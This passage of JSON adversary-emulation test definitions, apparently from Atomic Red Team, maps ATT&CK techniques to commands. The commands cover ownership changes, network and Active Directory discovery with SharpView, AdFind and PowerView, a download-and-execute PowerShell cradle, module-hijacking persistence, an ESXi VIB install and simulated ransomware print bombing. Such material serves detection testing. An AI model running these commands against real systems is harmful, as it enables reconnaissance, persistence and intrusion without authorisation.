				"prereq_command": "cc #{source_file} -o #{compiled_file}\n",
				"get_prereq_command": "cc #{source_file} -o #{compiled_file}\n"
			}
		],
		"executor": {
			"command": "#{compiled_file} /tmp/ T1222002\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Chown through c script",
		"auto_generated_guid": "18592ba1-5f88-4e3c-abc8-ab1c6042e389",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"source_file": {
				"description": "Path of c source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1222.002/src/chown.c"
			},
			"compiled_file": {
				"description": "Path of compiled file",
				"type": "path",
				"default": "/tmp/T1222002own"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
				"prereq_command": "gcc #{source_file} -o #{compiled_file}\n",
				"get_prereq_command": "gcc #{source_file} -o #{compiled_file}\n"
			}
		],
		"executor": {
			"command": "sudo #{compiled_file} #{source_file}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Chown through c script (freebsd)",
		"auto_generated_guid": "eb577a19-b730-4918-9b03-c5edcf51dc4e",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"source_file": {
				"description": "Path of c source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1222.002/src/chown.c"
			},
			"compiled_file": {
				"description": "Path of compiled file",
				"type": "path",
				"default": "/tmp/T1222002own"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
				"prereq_command": "cc #{source_file} -o #{compiled_file}\n",
				"get_prereq_command": "cc #{source_file} -o #{compiled_file}\n"
			}
		],
		"executor": {
			"command": "#{compiled_file} #{source_file}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "System Network Connections Discovery",
		"auto_generated_guid": "0940a971-809a-48f1-9c4d-b1d785e96ee5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netstat\nnet use\nnet sessions\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1049",
		"phases": ["discovery"]
	},
	{
		"name": "System Network Connections Discovery with PowerShell",
		"auto_generated_guid": "f069f0f1-baad-4831-aa2b-eddac4baac4a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-NetTCPConnection\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1049",
		"phases": ["discovery"]
	},
	{
		"name": "System Network Connections Discovery FreeBSD, Linux & MacOS",
		"auto_generated_guid": "9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2",
		"supported_platforms": ["linux", "macos"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if netstat command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v netstat)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Install netstat on the machine.\"; exit 1;\n"
			}
		],
		"executor": {
			"command": "netstat\nwho -a\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1049",
		"phases": ["discovery"]
	},
	{
		"name": "System Discovery using SharpView",
		"auto_generated_guid": "96f974bb-a0da-4d87-a744-ff33e73367e9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"SharpView_url": {
				"description": "sharpview download URL",
				"type": "url",
				"default": "https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true"
			},
			"SharpView": {
				"description": "Path of the executable opensource redteam tool used for the performing this atomic.",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe"
			},
			"syntax": {
				"description": "Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc.",
				"type": "string",
				"default": "\"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" \n"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sharpview.exe must exist on disk at specified location (#{SharpView})\n",
				"prereq_command": "if (Test-Path \"#{SharpView}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{SharpView}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest #{SharpView_url} -OutFile \"#{SharpView}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "$syntaxList = #{syntax}\nforeach ($syntax in $syntaxList) {\n#{SharpView} $syntax -}\n"
		},
		"attack_technique": "T1049",
		"phases": ["discovery"]
	},
	{
		"name": "powerShell Persistence via hijacking default modules - Get-Variable.exe",
		"auto_generated_guid": "1561de08-0b4b-498e-8261-e922f3494aae",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n",
			"cleanup_command": "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore\nStop-Process -Name \"calculator\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1574.008",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Remote System Discovery - net",
		"auto_generated_guid": "85321a9c-897f-4a60-9f20-29788e50bccd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net view /domain\nnet view\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - net group Domain Computers",
		"auto_generated_guid": "f1bf6c8f-9016-4edf-aff9-80b65f5d711f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net group \"Domain Computers\" /domain\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - nltest",
		"auto_generated_guid": "52ab5108-3f6f-42fb-8ba3-73bc054f22c8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_domain": {
				"description": "Domain to query for domain controllers",
				"type": "string",
				"default": "%userdnsdomain%"
			}
		},
		"executor": {
			"command": "nltest.exe /dclist:#{target_domain}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - ping sweep",
		"auto_generated_guid": "6db1f57f-d1d5-4223-8a66-55c9c65a9592",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"start_host": {
				"description": "Last octet starting value for ping sweep.",
				"type": "string",
				"default": "1"
			},
			"stop_host": {
				"description": "Last octet ending value for ping sweep.",
				"type": "string",
				"default": "254"
			},
			"subnet": {
				"description": "Subnet used for ping sweep.",
				"type": "string",
				"default": "192.168.1"
			}
		},
		"executor": {
			"command": "for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  \n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - arp",
		"auto_generated_guid": "2d5a61f5-0447-4be4-944a-1f8530ed6574",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "arp -a\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - arp nix",
		"auto_generated_guid": "acb6b1ff-e2ad-4d64-806c-6c35fe73b951",
		"supported_platforms": ["linux", "macos"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if arp command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "(which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools)\n"
			}
		],
		"executor": {
			"command": "arp -a | grep -v '^?'\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - sweep",
		"auto_generated_guid": "96db2632-8417-4dbb-b8bb-a8b92ba391de",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"start_host": {
				"description": "Subnet used for ping sweep.",
				"type": "string",
				"default": "1"
			},
			"stop_host": {
				"description": "Subnet used for ping sweep.",
				"type": "string",
				"default": "254"
			},
			"subnet": {
				"description": "Subnet used for ping sweep.",
				"type": "string",
				"default": "192.168.1"
			}
		},
		"executor": {
			"command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - nslookup",
		"auto_generated_guid": "baa01aaa-5e13-45ec-8a0d-e46c93c9760f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - adidnsdump",
		"auto_generated_guid": "95e19466-469e-4316-86d2-1dc401b5a959",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_name": {
				"description": "username including domain.",
				"type": "string",
				"default": "domain\\user"
			},
			"acct_pass": {
				"description": "Account password.",
				"type": "string",
				"default": "password"
			},
			"host_name": {
				"description": "hostname or ip address to connect to.",
				"type": "string",
				"default": "192.168.1.1"
			},
			"venv_path": {
				"description": "Path to the folder for the tactics venv",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1018"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must have python 3 installed\n",
				"prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
			},
			{
				"description": "Computer must have venv configured at #{venv_path}\n",
				"prereq_command": "if (Test-Path -Path \"#{venv_path}\" ) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "py -m venv \"#{venv_path}\"\n"
			},
			{
				"description": "adidnsdump must be installed\n",
				"prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\adidnsdump\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir adidnsdump 2>&1 | Out-Null\n"
			}
		],
		"executor": {
			"command": "\"#{venv_path}\\Scripts\\adidnsdump\" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory Computer Objects",
		"auto_generated_guid": "a889f5be-2d54-4050-bd05-884578748bb4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer) #{optional_args}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory Domain Controller Objects",
		"auto_generated_guid": "5838c31e-a0e2-4b9f-b60a-d79d2cb7995e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -sc dclist\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - ip neighbour",
		"auto_generated_guid": "158bd4dd-6359-40ab-b13c-285b9ef6fa25",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if ip command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "apt-get install iproute2 -y\n"
			}
		],
		"executor": {
			"command": "ip neighbour show\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - ip route",
		"auto_generated_guid": "1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if ip command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "apt-get install iproute2 -y\n"
			}
		],
		"executor": {
			"command": "ip route show\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - netstat",
		"auto_generated_guid": "d2791d72-b67f-4615-814f-ec824a91f514",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "netstat -r | grep default\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - ip tcp_metrics",
		"auto_generated_guid": "6c2da894-0b57-43cb-87af-46ea3b501388",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if ip command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "apt-get install iproute2 -y\n"
			}
		],
		"executor": {
			"command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate domain computers within Active Directory using DirectorySearcher",
		"auto_generated_guid": "962a6017-1c09-45a6-880b-adc9c57cb22e",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "This PC must be joined to a domain.",
				"prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}",
				"get_prereq_command": "write-host \"This PC must be manually added to a domain.\" "
			}
		],
		"executor": {
			"command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\")\n$DirectorySearcher.PropertiesToLoad.Add(\"Name\")\n$Computers = $DirectorySearcher.findall()\nforeach ($Computer in $Computers) {\n  $Computer = $Computer.Properties.name\n  if (!$Computer) { Continue }\n  Write-Host $Computer}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Active Directory Computers with Get-AdComputer",
		"auto_generated_guid": "97e89d9e-e3f5-41b5-a90f-1e0825df0fdf",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Get-AdComputer -Filter *\n"
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Active Directory Computers with ADSISearcher",
		"auto_generated_guid": "64ede6ac-b57a-41c2-a7d1-32c6cd35397d",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()\n"
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Get-DomainController with PowerView",
		"auto_generated_guid": "b9d2e8ca-5520-4737-8076-4f08913da2c4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Get-WmiObject to Enumerate Domain Controllers",
		"auto_generated_guid": "e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }\ncatch { $_; exit $_.Exception.HResult }\n"
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Remote System Discovery - net group Domain Controller",
		"auto_generated_guid": "5843529a-5056-4bc1-9c13-a311e2af4ca0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net group /domain \"Domain controllers\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Remote Hosts with Netscan",
		"auto_generated_guid": "b8147c9a-84db-4ec1-8eee-4e0da75f0de5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"netscan_path": {
				"description": "NetScan exe location",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\netscan\\64-bit\\netscan.exe"
			},
			"range_to_scan": {
				"description": "The IP range to scan with Netscan",
				"type": "string",
				"default": "127.0.0.1-127.0.0.1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Netscan must be installed\n",
				"prereq_command": "if (Test-Path \"#{netscan_path}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan.zip\" \"https://www.softperfect.com/download/files/netscan_portable.zip\"\nExpand-Archive -LiteralPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan\"\n"
			}
		],
		"executor": {
			"command": "cmd /c '#{netscan_path}' /hide /auto:\"$env:temp\\T1018NetscanOutput.txt\" /range:'#{range_to_scan}'",
			"cleanup_command": "remove-item \"$env:temp\\T1018NetscanOutput.txt\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1018",
		"phases": ["discovery"]
	},
	{
		"name": "ESXi - Install a custom VIB on an ESXi host",
		"auto_generated_guid": "7f843046-abf2-443f-b880-07a83cf968ec",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			},
			"plink_file": {
				"description": "Path to plink",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"pscp_file": {
				"description": "Path to Pscp",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe"
			},
			"vib_install": {
				"description": "Path to script with commands to install the vib",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\atomics\\T1129\\src\\esxi_vibinstall.txt"
			},
			"vib_remove": {
				"description": "Path to script with commands to remove the vib",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\atomics\\T1129\\src\\esxi_vibremove.txt"
			},
			"vib_file": {
				"description": "Path to the dummy vib",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\atomics\\T1129\\src\\atomicvibes.vib"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if plink and pscp are available.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\nif (Test-Path \"#{pscp_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\"\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe\"\n"
			}
		],
		"executor": {
			"command": "#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp\necho \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{vib_install}\"\n",
			"cleanup_command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{vib_remove}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1129",
		"phases": ["execution"]
	},
	{
		"name": "JScript execution to gather local computer information via cscript",
		"auto_generated_guid": "01d75adf-ca1b-4dd1-ac96-7c9550ad1035",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"jscript": {
				"description": "Path to sample script",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1059.007\\src\\sys_info.js"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sample script must exist on disk at specified location (#{jscript})",
				"prereq_command": "if (Test-Path \"#{jscript}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{jscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js\" -OutFile \"#{jscript}\""
			}
		],
		"executor": {
			"command": "cscript \"#{jscript}\" > %tmp%\\T1059.007.out.txt\n",
			"cleanup_command": "del %tmp%\\T1059.007.out.txt >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.007",
		"phases": ["execution"]
	},
	{
		"name": "JScript execution to gather local computer information via wscript",
		"auto_generated_guid": "0709945e-4fec-4c49-9faf-c3c292a74484",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"jscript": {
				"description": "Path to sample script",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1059.007\\src\\sys_info.js"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sample script must exist on disk at specified location (#{jscript})",
				"prereq_command": "if (Test-Path \"#{jscript}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{jscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js\" -OutFile \"#{jscript}\""
			}
		],
		"executor": {
			"command": "wscript \"#{jscript}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.007",
		"phases": ["execution"]
	},
	{
		"name": "Create and Execute Batch Script",
		"auto_generated_guid": "9e8894c0-50bd-4525-a96c-d4ac78ece388",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "Command to execute within script.",
				"type": "string",
				"default": "dir"
			},
			"script_path": {
				"description": "Script path.",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Batch file must exist on disk at specified location (#{script_path})\n",
				"prereq_command": "if (Test-Path \"#{script_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item \"#{script_path}\" -Force | Out-Null\nSet-Content -Path \"#{script_path}\" -Value \"#{command_to_execute}\"\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{script_path}\"\n",
			"cleanup_command": "Remove-Item \"#{script_path}\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.003",
		"phases": ["execution"]
	},
	{
		"name": "Writes text to a file and displays it.",
		"auto_generated_guid": "127b4afe-2346-4192-815c-69042bec570e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_contents_path": {
				"description": "Path to the file that the command prompt will drop.",
				"type": "path",
				"default": "%TEMP%\\test.bin"
			},
			"message": {
				"description": "Message that will be written to disk and then displayed.",
				"type": "string",
				"default": "Hello from the Windows Command Prompt!"
			}
		},
		"executor": {
			"command": "echo \"#{message}\" > \"#{file_contents_path}\" & type \"#{file_contents_path}\"\n",
			"cleanup_command": "del \"#{file_contents_path}\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.003",
		"phases": ["execution"]
	},
	{
		"name": "Suspicious Execution via Windows Command Shell",
		"auto_generated_guid": "d0eb3597-a1b3-4d65-b33b-2cda8d397f20",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "File to output to",
				"type": "string",
				"default": "hello.txt"
			},
			"input_message": {
				"description": "Message to write to file",
				"type": "string",
				"default": "Hello, from CMD!"
			}
		},
		"executor": {
			"command": "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.003",
		"phases": ["execution"]
	},
	{
		"name": "Simulate BlackByte Ransomware Print Bombing",
		"auto_generated_guid": "6b2903ac-8f36-450d-9ad5-b220e8a2dcb9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_print": {
				"description": "File to be opened/printed by Wordpad.",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt"
			},
			"max_to_print": {
				"description": "The maximum number of Wordpad windows the test will open/print.",
				"type": "integer",
				"default": 75
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "File to print must exist on disk at specified location (#{file_to_print})\n",
				"prereq_command": "if (test-path \"#{file_to_print}\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "new-item \"#{file_to_print}\" -value \"This file has been created by T1059.003 Test 4\" -Force | Out-Null\n"
			}
		],
		"executor": {
			"command": "cmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" | out-null\n",
			"cleanup_command": "stop-process -name wordpad -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.003",
		"phases": ["execution"]
	},
	{
		"name": "Command Prompt read contents from CMD file and execute",
		"auto_generated_guid": "df81db1b-066c-4802-9bc8-b6d030c3ba8e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "CMD file that is read by Command Prompt and execute, which launches calc.exe",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1059.003\\src\\t1059.003_cmd.cmd"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "CMD file must exist on disk at specified location (#{input_file})\n",
				"prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
